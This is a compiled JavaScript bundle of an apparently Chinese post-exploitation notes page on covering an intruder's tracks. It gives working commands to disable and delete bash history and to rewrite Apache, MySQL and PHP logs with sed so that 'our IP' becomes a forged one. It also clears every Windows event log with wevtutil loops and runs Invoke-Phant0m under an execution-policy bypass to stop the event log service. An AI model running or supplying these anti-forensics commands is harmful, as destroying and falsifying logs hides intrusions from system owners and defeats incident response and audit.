(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{772:function(s,a,t){"use strict";t.r(a);var e=t(103),r=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"日志处理"}},[s._v("日志处理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#日志处理"}},[s._v("#")])]),s._v(" "),t("h1",{attrs:{id:"linux日志处理"}},[s._v("Linux日志处理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#linux日志处理"}},[s._v("#")])]),s._v(" "),t("h2",{attrs:{id:"bash日志处理"}},[s._v("Bash日志处理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#bash日志处理"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("bash去掉history记录，让系统不记录history")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("HISTSIZE")])]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("HISTFILE")])]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/dev/null\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("history命令的清除，也是对~/.bash_history进行定向清除")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("history")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" -rf ~/.bash_history\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h2",{attrs:{id:"web日志处理"}},[s._v("Web日志处理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#web日志处理"}},[s._v("#")])]),s._v(" "),t("p",[s._v("如apache的access.log,error.log。")]),s._v(" "),t("p",[s._v("直接将日志清除过于明显,一般使用sed进行定向清除或伪造")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sed")]),s._v(" –i ‘s/192.168.1.3/8.8.8.8/g’ /var/log/apache/access.log\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sed")]),s._v(" –i ‘s/192.168.1.3/8.8.8.8/g’ /var/log/apache/error_log\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"syslog处理"}},[s._v("syslog处理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#syslog处理"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("/var/log/wtmp\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#永久记录所有用户的登录和注销信息，last查")]),s._v("\n/var/log/btmp\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#记录登录失败的日志，lastb查看")]),s._v("\n/var/log/secure\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#记录如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"mysql日志文件"}},[s._v("MySQL日志文件 "),t("a",{staticClass:"header-anchor",attrs:{href:"#mysql日志文件"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("log-error"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/log/mysql/mysql_error.log\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#错误日志")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("log")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/log/mysql/mysql.log\t\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等")]),s._v("\nlog-bin"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/log/mysql/mysql_bin.log\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 用于备份恢复，或主从复制.这里不涉及。")]),s._v("\nlog-slow-queries"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/log/mysql/mysql_slow.log\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#慢查询日志")]),s._v("\nlog-error"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/log/mysql/mysqld.log\npid-file"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/run/mysqld/mysqld.pid\n\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br")])]),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sed")]),s._v(" –i "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s/192.168.1.3/8.8.8.8/g'")]),s._v(" /var/log/mysql/mysql_error.log\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sed")]),s._v(" –i "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s/192.168.1.3/8.8.8.8/g'")]),s._v(" /var/log/mysql/mysql_slow.log\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h2",{attrs:{id:"php日志处理"}},[t("strong",[s._v("php日志处理")]),s._v(" "),t("a",{staticClass:"header-anchor",attrs:{href:"#php日志处理"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sed")]),s._v(" –i "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s/192.168.1.3/192.168.1.4/g'")]),s._v("/var/log/apache/php_error.log \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h1",{attrs:{id:"windows日志处理"}},[s._v("Windows日志处理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#windows日志处理"}},[s._v("#")])]),s._v(" "),t("h2",{attrs:{id:"一、wevtutil-for循环清除所有日志"}},[s._v("一、wevtutil+for循环清除所有日志 "),t("a",{staticClass:"header-anchor",attrs:{href:"#一、wevtutil-for循环清除所有日志"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language-cmd line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('for /F "tokens=*" %a in (\'wevtutil.exe el\') DO wevtutil.exe cl "%a"\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"二、-ps批量删日志"}},[s._v("二、 ps批量删日志 "),t("a",{staticClass:"header-anchor",attrs:{href:"#二、-ps批量删日志"}},[s._v("#")])]),s._v(" "),t("p",[s._v("如果弹回来的是一个ps的shell,直接用ps来批量删日志")]),s._v(" "),t("div",{staticClass:"language-cmd line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('PS C:\\> wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"三、运行ps脚本"}},[s._v("三、运行ps脚本 "),t("a",{staticClass:"header-anchor",attrs:{href:"#三、运行ps脚本"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("powershell –exec bypass –Command "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"& {Import-Module 'C:\\Invoke-Phant0m.ps1';Invoke-Phant0m}\"")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#win日志服务此时就会停止工作了")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])])])}),[],!1,null,null,null);a.default=r.exports}}]);